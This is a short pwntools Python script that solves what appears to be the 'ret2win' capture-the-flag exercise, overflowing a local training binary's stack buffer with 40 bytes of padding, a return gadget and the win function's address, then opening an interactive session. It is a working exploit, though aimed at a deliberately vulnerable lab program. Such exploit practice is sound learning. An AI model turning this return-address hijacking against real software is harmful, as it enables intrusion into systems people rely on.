from pwn import *

chall = './ret2win'

context.binary = chall
context.bits = 64

ret2win_address = p64(0x400756)
print(ret2win_address)
ret_gadget = p64(0x40053e)
offset = b'A'*40

payload = [
    offset,
    ret_gadget,
    ret2win_address
]

payload = b"".join(payload)

p = process([chall])

p.recvuntil(b'>')

p.sendline(payload)
p.interactive()